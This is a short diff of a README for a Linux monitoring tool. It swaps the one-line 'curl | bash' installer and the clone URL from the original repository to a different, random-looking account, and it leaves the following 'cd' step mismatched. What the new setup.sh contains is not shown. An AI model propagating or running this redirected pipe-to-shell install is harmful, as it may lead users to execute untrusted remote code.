@@ -18,7 +18,7 @@ A beautiful, real-time Linux system monitoring tool with live charts and WebSock
 ### One-line Install
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/monitorlinux/linux-system-monitor/main/setup.sh | bash
+curl -sSL https://raw.githubusercontent.com/2233qazwsx0/linux-sys-monitor/main/setup.sh | bash
 ```
 
 ### Manual Installation
@@ -40,7 +40,7 @@ sudo pacman -S nodejs npm
 
 3. Build and run:
 ```bash
-git clone https://github.com/monitorlinux/linux-system-monitor.git
+git clone https://github.com/2233qazwsx0/linux-sys-monitor.git
 cd linux-system-monitor
 chmod +x setup.sh
 ./setup.sh
